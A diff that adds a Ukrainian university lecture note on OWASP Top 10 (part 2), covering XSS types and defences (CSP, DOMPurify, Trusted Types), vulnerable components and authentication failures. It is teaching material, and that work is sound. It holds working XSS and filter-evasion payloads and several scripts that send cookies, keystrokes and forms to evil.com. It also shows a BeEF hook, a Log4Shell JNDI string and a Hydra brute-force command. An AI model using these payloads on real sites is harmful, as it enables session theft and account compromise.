@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 8: Безпека веб-додатків: OWASP Top 10 (Частина 2) — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 8: Безпека веб-додатків: OWASP Top 10 (Частина 2) — XSS, Vulnerable Components, Authentication Failures, SSRF, Burp Suite.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 8. Безпека веб-додатків: OWASP Top 10 (Частина 2)</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,18 +69,1465 @@
       <h1>Безпека веб-додатків: OWASP Top 10 (Частина 2)</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 8.1 XSS: Вступ та класифікація                              -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>8.1 Міжсайтовий скриптінг (XSS): класифікація та механізми</h2>
+
+        <p>Cross-Site Scripting (XSS) — одна з найпоширеніших вразливостей веб-додатків, яка дозволяє зловмиснику впровадити шкідливий JavaScript-код у сторінки, що переглядаються іншими користувачами. За даними OWASP, XSS входить до категорії A03:2021 — Injection, однак через свою унікальну природу та масштаб поширення заслуговує окремого глибокого розгляду.</p>
+
+        <p>XSS порушує <strong>Same-Origin Policy (SOP)</strong> — фундаментальний механізм безпеки браузера. Коли зловмисний скрипт виконується в контексті довіреного сайту, він отримує доступ до cookies, DOM, localStorage та інших ресурсів цього origin.</p>
+
+        <h3>Класифікація CWE</h3>
+        <table>
+          <tr>
+            <th>CWE</th>
+            <th>Тип</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>CWE-79</strong></td>
+            <td>Improper Neutralization of Input During Web Page Generation</td>
+            <td>Загальна категорія XSS</td>
+          </tr>
+          <tr>
+            <td><strong>CWE-80</strong></td>
+            <td>Basic XSS</td>
+            <td>Базовий XSS без кодування</td>
+          </tr>
+          <tr>
+            <td><strong>CWE-83</strong></td>
+            <td>XSS in Attributes</td>
+            <td>Ін'єкція в HTML-атрибути</td>
+          </tr>
+          <tr>
+            <td><strong>CWE-87</strong></td>
+            <td>Alternate XSS Syntax</td>
+            <td>Використання альтернативного синтаксису</td>
+          </tr>
+        </table>
+
+        <h3>Reflected XSS (Відображений)</h3>
+
+        <p>Reflected XSS (Type 1) — найпоширеніший тип. Шкідливий скрипт передається у запиті (URL, параметри форми) і негайно відображається у відповіді сервера без збереження. Жертва повинна клікнути на спеціально сформоване посилання.</p>
+
+        <p><strong>Механізм атаки:</strong></p>
+        <ol>
+          <li>Зловмисник створює URL з шкідливим payload у параметрі</li>
+          <li>Жертва переходить за посиланням (через фішинг, соцмережі тощо)</li>
+          <li>Сервер включає payload у HTML-відповідь без екранування</li>
+          <li>Браузер жертви виконує шкідливий скрипт у контексті довіреного сайту</li>
+        </ol>
+
+        <p><strong>Приклад вразливого коду (PHP):</strong></p>
+        <pre><code>&lt;!-- Вразливий код --&gt;
+&lt;p&gt;Результати пошуку для: &lt;?php echo $_GET['query']; ?&gt;&lt;/p&gt;
+
+&lt;!-- URL атаки --&gt;
+https://example.com/search?query=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+
+        <p><strong>Приклад вразливого коду (Node.js/Express):</strong></p>
+        <pre><code>// Вразливий код
+app.get('/search', (req, res) =&gt; {
+  res.send(`&lt;h1&gt;Результати для: ${req.query.q}&lt;/h1&gt;`);
+});
+
+// Безпечний код
+const escapeHtml = require('escape-html');
+app.get('/search', (req, res) =&gt; {
+  res.send(`&lt;h1&gt;Результати для: ${escapeHtml(req.query.q)}&lt;/h1&gt;`);
+});</code></pre>
+
+        <h3>Stored XSS (Збережений)</h3>
+
+        <p>Stored XSS (Type 2) — найнебезпечніший тип. Шкідливий скрипт зберігається на сервері (у базі даних, файловій системі, кеші) і виконується кожного разу, коли користувач відкриває сторінку з цим контентом. Не потребує спеціального посилання — атакує всіх відвідувачів.</p>
+
+        <p><strong>Типові вектори збереження:</strong></p>
+        <ul>
+          <li><strong>Коментарі та форуми</strong> — класичний вектор</li>
+          <li><strong>Профілі користувачів</strong> — ім'я, біо, аватар URL</li>
+          <li><strong>Повідомлення</strong> — чати, email-клієнти</li>
+          <li><strong>Назви файлів</strong> — при відображенні завантажених файлів</li>
+          <li><strong>Лог-записи</strong> — якщо лог-панель відображає raw-дані</li>
+          <li><strong>HTTP-заголовки</strong> — User-Agent, Referer, збережені в логах</li>
+        </ul>
+
+        <p><strong>Приклад:</strong></p>
+        <pre><code>&lt;!-- Зловмисник залишає коментар: --&gt;
+Чудова стаття!&lt;script&gt;
+  fetch('https://evil.com/log', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: window.location.href,
+      localStorage: JSON.stringify(localStorage)
+    })
+  });
+&lt;/script&gt;
+
+&lt;!-- Кожен відвідувач сторінки з коментарями автоматично
+     надсилає свої cookies та дані на сервер зловмисника --&gt;</code></pre>
+
+        <h3>DOM-based XSS</h3>
+
+        <p>DOM-based XSS (Type 0) — вразливість виникає повністю на клієнтській стороні, коли JavaScript-код читає дані з ненадійного джерела (source) і передає їх у небезпечну функцію (sink) без валідації. Сервер може ніколи не побачити шкідливий payload.</p>
+
+        <p><strong>Джерела (Sources) — звідки надходять дані:</strong></p>
+        <ul>
+          <li><code>document.URL</code>, <code>document.documentURI</code></li>
+          <li><code>location.href</code>, <code>location.search</code>, <code>location.hash</code></li>
+          <li><code>document.referrer</code></li>
+          <li><code>window.name</code></li>
+          <li><code>postMessage</code> дані</li>
+          <li>Web Storage: <code>localStorage</code>, <code>sessionStorage</code></li>
+        </ul>
+
+        <p><strong>Приймачі (Sinks) — куди потрапляють дані:</strong></p>
+        <table>
+          <tr>
+            <th>Sink</th>
+            <th>Рівень ризику</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><code>innerHTML</code></td>
+            <td>Високий</td>
+            <td>Парсить HTML, виконує скрипти через &lt;img onerror&gt;</td>
+          </tr>
+          <tr>
+            <td><code>outerHTML</code></td>
+            <td>Високий</td>
+            <td>Замінює елемент з HTML-парсингом</td>
+          </tr>
+          <tr>
+            <td><code>document.write()</code></td>
+            <td>Критичний</td>
+            <td>Вставляє HTML напряму в документ</td>
+          </tr>
+          <tr>
+            <td><code>eval()</code></td>
+            <td>Критичний</td>
+            <td>Виконує довільний JavaScript</td>
+          </tr>
+          <tr>
+            <td><code>setTimeout(string)</code></td>
+            <td>Критичний</td>
+            <td>Виконує рядок як код</td>
+          </tr>
+          <tr>
+            <td><code>location.href</code></td>
+            <td>Середній</td>
+            <td>Редирект (javascript: protocol)</td>
+          </tr>
+          <tr>
+            <td><code>jQuery.html()</code></td>
+            <td>Високий</td>
+            <td>Еквівалент innerHTML</td>
+          </tr>
+        </table>
+
+        <p><strong>Приклад DOM XSS:</strong></p>
+        <pre><code>// Вразливий код — читає з hash і вставляє в DOM
+var userInput = location.hash.substring(1);
+document.getElementById('welcome').innerHTML = 'Привіт, ' + userInput;
+
+// URL атаки:
+// https://example.com/page#&lt;img src=x onerror=alert(document.cookie)&gt;
+
+// Безпечний код — використовує textContent
+var userInput = location.hash.substring(1);
+document.getElementById('welcome').textContent = 'Привіт, ' + userInput;</code></pre>
+
+        <h3>Порівняння типів XSS</h3>
+        <table>
+          <tr>
+            <th>Характеристика</th>
+            <th>Reflected</th>
+            <th>Stored</th>
+            <th>DOM-based</th>
+          </tr>
+          <tr>
+            <td><strong>Збереження</strong></td>
+            <td>Ні (у запиті)</td>
+            <td>Так (на сервері)</td>
+            <td>Ні (у клієнті)</td>
+          </tr>
+          <tr>
+            <td><strong>Потрібна дія жертви</strong></td>
+            <td>Клік на посилання</td>
+            <td>Відвідування сторінки</td>
+            <td>Клік на посилання</td>
+          </tr>
+          <tr>
+            <td><strong>Сервер бачить payload</strong></td>
+            <td>Так</td>
+            <td>Так</td>
+            <td>Не обов'язково</td>
+          </tr>
+          <tr>
+            <td><strong>Масштаб ураження</strong></td>
+            <td>Одна жертва</td>
+            <td>Усі відвідувачі</td>
+            <td>Одна жертва</td>
+          </tr>
+          <tr>
+            <td><strong>Складність виявлення</strong></td>
+            <td>Середня</td>
+            <td>Низька</td>
+            <td>Висока</td>
+          </tr>
+          <tr>
+            <td><strong>WAF захист</strong></td>
+            <td>Можливий</td>
+            <td>Можливий</td>
+            <td>Неефективний</td>
+          </tr>
+        </table>
+
+        <h3>Наслідки успішної XSS-атаки</h3>
+        <ul>
+          <li><strong>Крадіжка сесії</strong> — перехоплення cookies або токенів автентифікації</li>
+          <li><strong>Keylogging</strong> — перехоплення натискань клавіш (паролі, номери карток)</li>
+          <li><strong>Фішинг</strong> — підміна форми логіну на фейкову у контексті легітимного сайту</li>
+          <li><strong>Поширення malware</strong> — drive-by download атаки</li>
+          <li><strong>Defacement</strong> — зміна вмісту сторінки</li>
+          <li><strong>Криптомайнінг</strong> — використання ресурсів браузера жертви</li>
+          <li><strong>Worm-атаки</strong> — самопоширюваний XSS (Samy worm, 2005)</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.2 XSS: Експлуатація та захист                             -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.2 XSS: експлуатація та захист</h2>
+
+        <h3>Базові payload'и XSS</h3>
+
+        <p>Вибір payload залежить від контексту ін'єкції — HTML-тіло, атрибут, JavaScript-блок, CSS або URL.</p>
+
+        <pre><code>&lt;!-- Контекст: HTML body --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;details open ontoggle=alert('XSS')&gt;
+&lt;marquee onstart=alert('XSS')&gt;
+
+&lt;!-- Контекст: HTML attribute --&gt;
+" onfocus=alert('XSS') autofocus="
+' onfocus=alert('XSS') autofocus='
+" onmouseover=alert('XSS') "
+
+&lt;!-- Контекст: JavaScript string --&gt;
+'; alert('XSS'); //
+"; alert('XSS'); //
+\'; alert(\'XSS\'); //
+
+&lt;!-- Контекст: URL / href --&gt;
+javascript:alert('XSS')
+data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+&lt;!-- Контекст: CSS --&gt;
+expression(alert('XSS'))  /* IE-only, legacy */
+url('javascript:alert("XSS")')  /* деякі старі браузери */</code></pre>
+
+        <h3>Обхід фільтрів (Filter Evasion)</h3>
+
+        <p>Коли додаток фільтрує очевидні payload'и, зловмисники використовують техніки обходу:</p>
+
+        <p><strong>Зміна регістру та кодування:</strong></p>
+        <pre><code>&lt;!-- Mixed case --&gt;
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;IMG SRC=x OnErRoR=alert('XSS')&gt;
+
+&lt;!-- HTML entities --&gt;
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&gt;
+
+&lt;!-- URL encoding --&gt;
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+&lt;!-- Double URL encoding --&gt;
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+&lt;!-- Unicode escapes (JavaScript) --&gt;
+\u0061\u006c\u0065\u0072\u0074(1)
+
+&lt;!-- Null bytes (обхід WAF) --&gt;
+&lt;scri%00pt&gt;alert('XSS')&lt;/scri%00pt&gt;</code></pre>
+
+        <p><strong>Альтернативні теги та події:</strong></p>
+        <pre><code>&lt;!-- Без скриптового тега --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;
+&lt;object data="javascript:alert(1)"&gt;
+&lt;embed src="javascript:alert(1)"&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id="x"&gt;&lt;/textarea&gt;&lt;img onerror=alert(1) src&gt;</code></pre>
+
+        <p><strong>Конкатенація та обфускація:</strong></p>
+        <pre><code>&lt;!-- String concatenation --&gt;
+&lt;script&gt;window['al'+'ert'](1)&lt;/script&gt;
+
+&lt;!-- Constructor abuse --&gt;
+&lt;script&gt;[].constructor.constructor('alert(1)')()&lt;/script&gt;
+
+&lt;!-- atob (base64 decode) --&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+
+&lt;!-- fetch() без дужок --&gt;
+&lt;script&gt;throw/a]&gt;/;onerror=alert&lt;/script&gt;
+
+&lt;!-- Template literals --&gt;
+&lt;script&gt;alert`XSS`&lt;/script&gt;</code></pre>
+
+        <h3>Реальні payload'и для крадіжки даних</h3>
+        <pre><code>// Крадіжка cookies
+&lt;script&gt;
+  new Image().src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+
+// Keylogger
+&lt;script&gt;
+  document.addEventListener('keypress', function(e) {
+    new Image().src = 'https://evil.com/keys?k=' + e.key;
+  });
+&lt;/script&gt;
+
+// Крадіжка форми (credential harvesting)
+&lt;script&gt;
+  document.forms[0].action = 'https://evil.com/phish';
+&lt;/script&gt;
+
+// Перенаправлення на фішингову сторінку
+&lt;script&gt;
+  if (document.cookie.indexOf('admin') !== -1) {
+    window.location = 'https://evil.com/admin-phish';
+  }
+&lt;/script&gt;
+
+// BeEF hook (Browser Exploitation Framework)
+&lt;script src="https://evil.com/hook.js"&gt;&lt;/script&gt;</code></pre>
+
+        <h3>Content Security Policy (CSP)</h3>
+
+        <p>CSP — HTTP-заголовок, що визначає дозволені джерела контенту для сторінки. Це <strong>найефективніший</strong> механізм захисту від XSS на рівні браузера.</p>
+
+        <pre><code># Суворий CSP
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
+
+# CSP з nonce (рекомендований підхід)
+Content-Security-Policy: script-src 'nonce-abc123Random' 'strict-dynamic'
+
+# У HTML:
+&lt;script nonce="abc123Random"&gt;
+  // Цей скрипт виконається
+&lt;/script&gt;
+&lt;script&gt;
+  // Цей скрипт буде заблоковано — немає nonce
+&lt;/script&gt;
+
+# CSP з hash
+Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</code></pre>
+
+        <p><strong>Директиви CSP:</strong></p>
+        <table>
+          <tr>
+            <th>Директива</th>
+            <th>Контролює</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><code>default-src</code></td>
+            <td>Fallback для всіх типів</td>
+            <td><code>'self'</code></td>
+          </tr>
+          <tr>
+            <td><code>script-src</code></td>
+            <td>JavaScript</td>
+            <td><code>'self' 'nonce-xxx'</code></td>
+          </tr>
+          <tr>
+            <td><code>style-src</code></td>
+            <td>CSS</td>
+            <td><code>'self' 'unsafe-inline'</code></td>
+          </tr>
+          <tr>
+            <td><code>img-src</code></td>
+            <td>Зображення</td>
+            <td><code>'self' data: https:</code></td>
+          </tr>
+          <tr>
+            <td><code>connect-src</code></td>
+            <td>AJAX, WebSocket, fetch</td>
+            <td><code>'self' https://api.example.com</code></td>
+          </tr>
+          <tr>
+            <td><code>frame-ancestors</code></td>
+            <td>Хто може вбудовувати сторінку</td>
+            <td><code>'none'</code></td>
+          </tr>
+          <tr>
+            <td><code>base-uri</code></td>
+            <td>Дозволені значення &lt;base&gt;</td>
+            <td><code>'self'</code></td>
+          </tr>
+          <tr>
+            <td><code>report-uri</code></td>
+            <td>Куди слати звіти про порушення</td>
+            <td><code>/csp-report</code></td>
+          </tr>
+        </table>
+
+        <h3>Обхід CSP</h3>
+        <p>Навіть CSP може мати вразливості у конфігурації:</p>
+        <ul>
+          <li><code>'unsafe-inline'</code> у <code>script-src</code> — повністю нівелює захист від XSS</li>
+          <li><code>'unsafe-eval'</code> — дозволяє <code>eval()</code>, <code>Function()</code>, <code>setTimeout(string)</code></li>
+          <li><strong>Wildcard domains</strong> — <code>script-src *.googleapis.com</code> може включити JSONP-ендпоінти</li>
+          <li><strong>JSONP-ендпоінти</strong> — у дозволених доменах: <code>callback=alert(1)</code></li>
+          <li><strong>Base-uri missing</strong> — дозволяє <code>&lt;base href="https://evil.com"&gt;</code> для підміни шляхів</li>
+          <li><strong>Angular/React CDN</strong> — у дозволених доменах можна виконати код через шаблони фреймворку</li>
+        </ul>
+
+        <h3>Захист від XSS: комплексний підхід</h3>
+
+        <p><strong>1. Output Encoding (контекстне екранування):</strong></p>
+        <pre><code>// HTML контекст
+&amp;lt; &amp;gt; &amp;amp; &amp;quot; &amp;#x27; → замість &lt; &gt; &amp; " '
+
+// JavaScript контекст
+\x3c \x3e \x27 \x22 → Unicode/hex escape
+
+// URL контекст
+encodeURIComponent(userInput)
+
+// CSS контекст
+CSS.escape(userInput)</code></pre>
+
+        <p><strong>2. Input Validation:</strong></p>
+        <ul>
+          <li>Whitelist-підхід: дозволяти тільки очікувані символи та формати</li>
+          <li>Для email: регулярний вираз для email</li>
+          <li>Для числових полів: перевірка типу</li>
+          <li>Довжина рядків: обмеження максимальної довжини</li>
+        </ul>
+
+        <p><strong>3. Sanitization (DOMPurify):</strong></p>
+        <pre><code>// Клієнтський sanitizer — DOMPurify
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+  ALLOWED_ATTR: ['href', 'title'],
+  ALLOW_DATA_ATTR: false
+});
+
+// Server-side sanitizer — bleach (Python)
+import bleach
+clean = bleach.clean(dirty, tags=['b', 'i', 'a'], attributes={'a': ['href']})
+
+// Server-side — sanitize-html (Node.js)
+const sanitizeHtml = require('sanitize-html');
+const clean = sanitizeHtml(dirty, {
+  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
+  allowedAttributes: { 'a': ['href'] }
+});</code></pre>
+
+        <p><strong>4. Cookie-прапорці:</strong></p>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Захист від</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><code>HttpOnly</code></td>
+            <td>XSS крадіжка cookies</td>
+            <td><code>Set-Cookie: session=abc; HttpOnly</code></td>
+          </tr>
+          <tr>
+            <td><code>Secure</code></td>
+            <td>Передача по HTTP</td>
+            <td><code>Set-Cookie: session=abc; Secure</code></td>
+          </tr>
+          <tr>
+            <td><code>SameSite</code></td>
+            <td>CSRF, часткове XSS</td>
+            <td><code>Set-Cookie: session=abc; SameSite=Strict</code></td>
+          </tr>
+        </table>
+
+        <p><strong>5. Trusted Types API (Chrome 83+):</strong></p>
+        <pre><code>// Включення Trusted Types через CSP
+Content-Security-Policy: require-trusted-types-for 'script'
+
+// Створення політики
+const policy = trustedTypes.createPolicy('myPolicy', {
+  createHTML: (input) =&gt; DOMPurify.sanitize(input),
+  createScriptURL: (input) =&gt; {
+    if (input.startsWith('https://cdn.example.com/')) return input;
+    throw new TypeError('Blocked URL: ' + input);
+  }
+});
+
+// Використання — innerHTML тепер вимагає TrustedHTML
+element.innerHTML = policy.createHTML(userInput);</code></pre>
+
+        <h3>Відомі XSS-інциденти</h3>
+        <table>
+          <tr>
+            <th>Інцидент</th>
+            <th>Рік</th>
+            <th>Деталі</th>
+          </tr>
+          <tr>
+            <td><strong>Samy Worm</strong></td>
+            <td>2005</td>
+            <td>Stored XSS у MySpace; за 20 годин заразив понад 1 млн профілів, змушуючи кожного додати Samy у друзі</td>
+          </tr>
+          <tr>
+            <td><strong>TweetDeck</strong></td>
+            <td>2014</td>
+            <td>Stored XSS у Twitter-клієнті; самоRetweeting worm поширився серед 40 000+ користувачів</td>
+          </tr>
+          <tr>
+            <td><strong>British Airways</strong></td>
+            <td>2018</td>
+            <td>Magecart-атака через XSS-ін'єкцію у платіжну сторінку; вкрадено 380 000 карток. Штраф £20 млн (GDPR)</td>
+          </tr>
+          <tr>
+            <td><strong>eBay</strong></td>
+            <td>2015-2016</td>
+            <td>XSS у описах товарів дозволяв перенаправляти покупців на фішингові сторінки</td>
+          </tr>
+          <tr>
+            <td><strong>Fortnite</strong></td>
+            <td>2019</td>
+            <td>Reflected XSS на старому домені Epic Games; дозволяв крадіжку акаунтів через SSO-токени</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.3 A06: Вразливі та застарілі компоненти                    -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.3 A06: Вразливі та застарілі компоненти (Vulnerable and Outdated Components)</h2>
+
+        <p>Сучасні веб-додатки побудовані на десятках і сотнях сторонніх бібліотек, фреймворків та компонентів. За даними Synopsys (OSSRA 2024), <strong>96% комерційних кодових баз</strong> містять open-source компоненти, а <strong>84%</strong> мають принаймні одну відому вразливість.</p>
+
+        <p>Категорія A06:2021 піднялася з A09:2017, підкреслюючи зростання ризику supply-chain атак та залежностей.</p>
+
+        <h3>Типи вразливих компонентів</h3>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Приклади</th>
+            <th>Ризик</th>
+          </tr>
+          <tr>
+            <td><strong>Бібліотеки</strong></td>
+            <td>jQuery, lodash, Log4j, OpenSSL</td>
+            <td>Прямі вразливості в коді</td>
+          </tr>
+          <tr>
+            <td><strong>Фреймворки</strong></td>
+            <td>Spring, Django, Rails, Express</td>
+            <td>Вразливості на рівні архітектури</td>
+          </tr>
+          <tr>
+            <td><strong>Транзитивні залежності</strong></td>
+            <td>Залежності ваших залежностей</td>
+            <td>Непрямий ризик, важко відстежити</td>
+          </tr>
+          <tr>
+            <td><strong>Runtime/Platform</strong></td>
+            <td>Node.js, Python, PHP, Java</td>
+            <td>Системні вразливості</td>
+          </tr>
+          <tr>
+            <td><strong>Веб-сервери</strong></td>
+            <td>Apache, Nginx, IIS</td>
+            <td>Помилки конфігурації, CVE</td>
+          </tr>
+          <tr>
+            <td><strong>CMS та плагіни</strong></td>
+            <td>WordPress, Drupal, їх плагіни</td>
+            <td>Масова експлуатація</td>
+          </tr>
+        </table>
+
+        <h3>Резонансні інциденти</h3>
+
+        <p><strong>Log4Shell (CVE-2021-44228)</strong> — критична вразливість у бібліотеці логування Log4j (Java). CVSS 10.0. Дозволяла Remote Code Execution через спеціальний рядок у лог-записі: <code>${jndi:ldap://evil.com/payload}</code>. Вразливими виявилися тисячі продуктів: Apache Solr, Elasticsearch, Minecraft, VMware, iCloud та інші. Цей інцидент показав ризик транзитивних залежностей — більшість організацій навіть не знали, що використовують Log4j.</p>
+
+        <p><strong>Equifax Breach (2017)</strong> — використання відомої вразливості Apache Struts (CVE-2017-5638, CVSS 10.0) через 2 місяці після виходу патча. Результат: витік персональних даних 147 млн осіб. Штраф: $700 млн.</p>
+
+        <p><strong>event-stream (2018)</strong> — supply-chain атака на npm-пакет. Зловмисник отримав права maintainer'а і додав шкідливий код у flatmap-stream для крадіжки Bitcoin-гаманців у додатку Copay. Пакет мав 2 млн завантажень/тиждень.</p>
+
+        <p><strong>SolarWinds (2020)</strong> — supply-chain атака на систему збірки Orion Platform. Шкідливий бекдор (SUNBURST) потрапив у офіційне оновлення, встановлене 18 000+ організаціями, включаючи Міністерство фінансів та Пентагон.</p>
+
+        <h3>Software Composition Analysis (SCA)</h3>
+
+        <p>SCA-інструменти автоматично сканують залежності проекту на відомі вразливості:</p>
+
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Тип</th>
+            <th>Підтримка</th>
+            <th>Особливості</th>
+          </tr>
+          <tr>
+            <td><strong>npm audit</strong></td>
+            <td>Вбудований</td>
+            <td>npm (Node.js)</td>
+            <td><code>npm audit</code>, <code>npm audit fix</code></td>
+          </tr>
+          <tr>
+            <td><strong>pip-audit</strong></td>
+            <td>CLI</td>
+            <td>Python</td>
+            <td>Перевірка requirements.txt / pipenv</td>
+          </tr>
+          <tr>
+            <td><strong>OWASP Dependency-Check</strong></td>
+            <td>CLI / Plugin</td>
+            <td>Java, .NET, Node.js</td>
+            <td>NVD database, CVSS scores</td>
+          </tr>
+          <tr>
+            <td><strong>Snyk</strong></td>
+            <td>SaaS + CLI</td>
+            <td>Multi-language</td>
+            <td>CI/CD інтеграція, auto-fix PR</td>
+          </tr>
+          <tr>
+            <td><strong>Dependabot</strong></td>
+            <td>GitHub</td>
+            <td>Multi-language</td>
+            <td>Автоматичні PR з оновленнями</td>
+          </tr>
+          <tr>
+            <td><strong>Trivy</strong></td>
+            <td>CLI (OSS)</td>
+            <td>Containers, FS, Git</td>
+            <td>Docker images + залежності</td>
+          </tr>
+          <tr>
+            <td><strong>Grype</strong></td>
+            <td>CLI (OSS)</td>
+            <td>Multi-language</td>
+            <td>SBOM-сумісний (Anchore)</td>
+          </tr>
+        </table>
+
+        <pre><code># npm audit
+npm audit
+npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical")'
+
+# pip-audit (Python)
+pip install pip-audit
+pip-audit
+
+# OWASP Dependency-Check
+dependency-check --project "MyApp" --scan ./lib
+
+# Trivy (Docker image)
+trivy image myapp:latest
+
+# Trivy (filesystem)
+trivy fs --security-checks vuln .</code></pre>
+
+        <h3>SBOM (Software Bill of Materials)</h3>
+
+        <p>SBOM — стандартизований перелік усіх компонентів програмного продукту. Два основні формати:</p>
+        <ul>
+          <li><strong>SPDX</strong> (Linux Foundation) — ISO/IEC 5962:2021</li>
+          <li><strong>CycloneDX</strong> (OWASP) — фокус на безпеці</li>
+        </ul>
+        <p>Указ Президента США Executive Order 14028 (2021) вимагає SBOM для всього ПЗ, що постачається федеральному уряду.</p>
+
+        <h3>Запобігання</h3>
+        <ul>
+          <li><strong>Інвентаризація залежностей</strong> — знати все, що використовується (включно з транзитивними)</li>
+          <li><strong>Регулярне оновлення</strong> — автоматизовані PR (Dependabot, Renovate)</li>
+          <li><strong>Lock-файли</strong> — <code>package-lock.json</code>, <code>Pipfile.lock</code>, <code>Gemfile.lock</code></li>
+          <li><strong>Pin versions</strong> — фіксувати конкретні версії, не використовувати <code>*</code> або <code>latest</code></li>
+          <li><strong>Моніторинг CVE</strong> — підписка на NVD alerts для критичних залежностей</li>
+          <li><strong>Видалення непотрібного</strong> — кожна залежність збільшує поверхню атаки</li>
+          <li><strong>Verify integrity</strong> — перевіряти хеші та підписи пакетів</li>
+          <li><strong>Private registry</strong> — проксі-репозиторій для контролю дозволених пакетів</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.4 A07: Помилки ідентифікації та автентифікації              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.4 A07: Помилки ідентифікації та автентифікації (Identification and Authentication Failures)</h2>
+
+        <p>Категорія A07:2021 (раніше A02:2017 — Broken Authentication) охоплює вразливості в механізмах підтвердження ідентичності користувача. Правильна автентифікація є першою лінією захисту — якщо вона порушена, всі інші механізми безпеки стають неефективними.</p>
+
+        <h3>Типи автентифікації</h3>
+        <table>
+          <tr>
+            <th>Фактор</th>
+            <th>Тип</th>
+            <th>Приклади</th>
+          </tr>
+          <tr>
+            <td><strong>Щось, що ви знаєте</strong></td>
+            <td>Knowledge</td>
+            <td>Пароль, PIN, секретне питання</td>
+          </tr>
+          <tr>
+            <td><strong>Щось, що ви маєте</strong></td>
+            <td>Possession</td>
+            <td>Телефон (OTP), FIDO2 ключ, смарт-карта</td>
+          </tr>
+          <tr>
+            <td><strong>Щось, що ви є</strong></td>
+            <td>Inherence</td>
+            <td>Відбиток пальця, Face ID, голос</td>
+          </tr>
+        </table>
+        <p><strong>MFA (Multi-Factor Authentication)</strong> — комбінація двох або більше факторів. SMS-OTP вважається слабким через SIM-swapping; TOTP (Google Authenticator) та FIDO2/WebAuthn (апаратні ключі) — рекомендовані.</p>
+
+        <h3>Типові вразливості автентифікації</h3>
+
+        <p><strong>1. Credential Stuffing:</strong></p>
+        <p>Використання баз витечених логінів/паролів з інших сервісів. Ефективний, оскільки 65% користувачів повторно використовують паролі (Google Security Survey). Інструменти: Hydra, Burp Intruder, спеціалізовані скрипти.</p>
+
+        <p><strong>2. Brute Force:</strong></p>
+        <pre><code># Hydra — brute force HTTP login form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  target.com http-post-form \
+  "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"
+
+# Захист: Rate limiting, Account lockout, CAPTCHA
+# Обхід: IP rotation, розподілений підбір, зміна User-Agent</code></pre>
+
+        <p><strong>3. Слабка політика паролів:</strong></p>
+        <ul>
+          <li>Мінімальна довжина &lt; 8 символів</li>
+          <li>Відсутність перевірки у базах витечених паролів (Have I Been Pwned API)</li>
+          <li>Дозвіл простих паролів: <code>password</code>, <code>123456</code>, <code>qwerty</code></li>
+          <li>Надмірно складні правила, що змушують записувати пароль</li>
+        </ul>
+
+        <p><strong>Рекомендації NIST SP 800-63B (2024):</strong></p>
+        <ul>
+          <li>Мінімум 8 символів, рекомендовано 15+</li>
